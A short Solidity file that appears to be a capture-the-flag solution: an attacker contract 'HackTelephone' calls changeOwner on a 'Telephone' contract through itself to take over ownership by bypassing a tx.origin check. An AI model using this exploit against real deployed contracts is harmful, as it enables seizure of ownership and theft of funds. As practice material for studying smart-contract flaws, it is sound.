pragma solidity ^0.5.1;

contract Telephone {
  function changeOwner(address _owner) public;
}

contract HackTelephone {
    Telephone public originalContract;

    constructor(address telephoneAddress) public {
        originalContract = Telephone(telephoneAddress);
    }

    function hack() public {
        originalContract.changeOwner(msg.sender);
    }

}
